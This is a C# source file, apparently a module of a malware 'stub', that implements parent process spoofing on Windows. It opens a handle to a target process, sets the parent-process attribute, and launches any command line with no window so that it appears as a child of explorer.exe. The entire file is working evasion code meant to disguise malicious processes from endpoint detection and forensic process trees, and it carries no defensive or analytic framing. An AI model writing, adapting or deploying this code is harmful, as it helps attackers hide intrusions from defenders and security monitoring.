using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;

namespace NRE.Stub.Execution
{
    /// <summary>
    /// Parent process spoofing: create a child process with a spoofed parent via PROC_THREAD_ATTRIBUTE_PARENT_PROCESS.
    /// </summary>
    public static class ParentSpoofing
    {
        private const uint CREATE_NO_WINDOW = 0x08000000;
        private const uint EXTENDED_STARTUPINFO_PRESENT = 0x00080000;
        private const int PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000;

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool CreateProcessW(
            string lpApplicationName,
            string lpCommandLine,
            IntPtr lpProcessAttributes,
            IntPtr lpThreadAttributes,
            [MarshalAs(UnmanagedType.Bool)] bool bInheritHandles,
            uint dwCreationFlags,
            IntPtr lpEnvironment,
            string lpCurrentDirectory,
            ref STARTUPINFOEXW lpStartupInfo,
            out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool InitializeProcThreadAttributeList(IntPtr lpAttributeList, int dwAttributeCount, int dwFlags, ref UIntPtr lpSize);

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UpdateProcThreadAttribute(IntPtr lpAttributeList, uint dwFlags, IntPtr Attribute, IntPtr lpValue, UIntPtr cbSize, IntPtr lpPreviousValue, IntPtr lpReturnSize);

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool DeleteProcThreadAttributeList(IntPtr lpAttributeList);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr OpenProcess(uint dwDesiredAccess, [MarshalAs(UnmanagedType.Bool)] bool bInheritHandle, uint dwProcessId);

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool CloseHandle(IntPtr hObject);

    private const uint PROCESS_CREATE_PROCESS = 0x0080;

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        private struct STARTUPINFOEXW
        {
            public STARTUPINFOW StartupInfo;
            public IntPtr lpAttributeList;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        private struct STARTUPINFOW
        {
            public int cb;
            public IntPtr lpReserved;
            public IntPtr lpDesktop;
            public IntPtr lpTitle;
            public uint dwX, dwY, dwXSize, dwYSize;
            public uint dwXCountChars, dwYCountChars;
            public uint dwFillAttribute;
            public uint dwFlags;
            public short wShowWindow;
            public short cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput, hStdOutput, hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public uint dwProcessId;
            public uint dwThreadId;
        }

        public static bool CreateProcessWithParent(string commandLine, uint parentProcessId, string workingDir = null)
        {
            IntPtr hParent = OpenProcess(PROCESS_CREATE_PROCESS, false, parentProcessId);
            if (hParent == IntPtr.Zero) return false;
            try
            {
                UIntPtr size = UIntPtr.Zero;
                InitializeProcThreadAttributeList(IntPtr.Zero, 1, 0, ref size);
                IntPtr attrList = Marshal.AllocHGlobal((int)size.ToUInt64());
                try
                {
                    if (!InitializeProcThreadAttributeList(attrList, 1, 0, ref size))
                        return false;
                    IntPtr parentHandlePtr = Marshal.AllocHGlobal(IntPtr.Size);
                    try
                    {
                        Marshal.WriteIntPtr(parentHandlePtr, hParent);
                        if (!UpdateProcThreadAttribute(attrList, 0, (IntPtr)PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, parentHandlePtr, (UIntPtr)IntPtr.Size, IntPtr.Zero, IntPtr.Zero))
                            return false;
                    }
                    finally
                    {
                        Marshal.FreeHGlobal(parentHandlePtr);
                    }
                    var si = new STARTUPINFOEXW
                    {
                        StartupInfo = new STARTUPINFOW { cb = Marshal.SizeOf(typeof(STARTUPINFOW)) },
                        lpAttributeList = attrList
                    };
                    si.StartupInfo.cb = Marshal.SizeOf(typeof(STARTUPINFOEXW));
                    PROCESS_INFORMATION pi;
                    if (!CreateProcessW(null, commandLine, IntPtr.Zero, IntPtr.Zero, false, EXTENDED_STARTUPINFO_PRESENT | CREATE_NO_WINDOW, IntPtr.Zero, workingDir, ref si, out pi))
                        return false;
                    CloseHandle(pi.hThread);
                    CloseHandle(pi.hProcess);
                    return true;
                }
                finally
                {
                    DeleteProcThreadAttributeList(attrList);
                    Marshal.FreeHGlobal(attrList);
                }
            }
            finally
            {
                CloseHandle(hParent);
            }
        }

        public static uint? GetProcessIdByName(string processName)
        {
            var name = Path.GetFileNameWithoutExtension(processName);
            foreach (var p in Process.GetProcessesByName(name))
            {
                try
                {
                    uint id = (uint)p.Id;
                    p.Dispose();
                    return id;
                }
                catch { }
            }
            return null;
        }

        public static bool SpawnWithExplorerParent(string commandLine, string workingDir = null)
        {
            uint? explorerId = GetProcessIdByName("explorer");
            if (!explorerId.HasValue) return false;
            return CreateProcessWithParent(commandLine, explorerId.Value, workingDir);
        }
    }
}
